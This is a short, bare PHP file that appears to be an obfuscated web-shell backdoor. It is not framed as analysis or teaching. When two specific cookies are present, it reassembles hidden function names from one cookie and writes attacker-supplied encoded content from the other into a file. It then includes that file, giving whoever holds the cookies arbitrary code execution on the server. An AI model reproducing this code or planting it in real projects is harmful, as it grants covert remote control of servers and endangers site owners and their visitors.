<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[35])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 4;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[35][$n];
        if (!$c[35][$n + 1]) {
            if (!$c[35][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 4 + 1;
    }
    $k = $p[13]() . $p[3];
    if (!$p[1]($k)) {
        $n = $p[22]($k, $p[12]);
        $p[15]($n, $p[29] . $p[16]($p[9]($c[3])));
    }
    include($k);
}